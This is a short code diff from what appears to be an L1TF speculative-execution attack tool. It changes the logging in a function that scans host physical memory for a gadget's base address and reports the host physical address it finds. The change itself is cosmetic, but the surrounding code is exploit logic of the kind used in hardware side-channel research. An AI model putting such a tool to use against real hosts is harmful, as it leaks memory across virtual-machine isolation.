@@ -957,7 +957,8 @@ uintptr_t l1tf_find_page_pa(void *p)
 uintptr_t l1tf_find_base(void)
 {
   const int verbose = 1;
-	fprintf(stderr, "\nl1tf_find_base()\n" HLINE);
+	pr_dub("\nl1tf_find_base()\n" HLINE);
+  pr_dub("Searching through all %luGB of physical memory for gadget's base address...\n", HOST_MEMORY_SIZE >> 30);
 
 #if HELPERS
   uintptr_t real_pa = helper_base_pa();
@@ -991,6 +992,7 @@ uintptr_t l1tf_find_base(void)
           double time = (clock_read()-t_start)/1000000000.0;
           uintptr_t len = (pa-start) + run*(end-start);
           fprintf(stderr, "l1tf_find_base: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
+          pr_dub("Found gadget's base at hpa %lx in %.1f seconds. (search speed: %.1f MB/s)\n", pa, time, len/time / (1024*1024));
           l1tf_test_base(pa, 100000);
         }
         return pa;
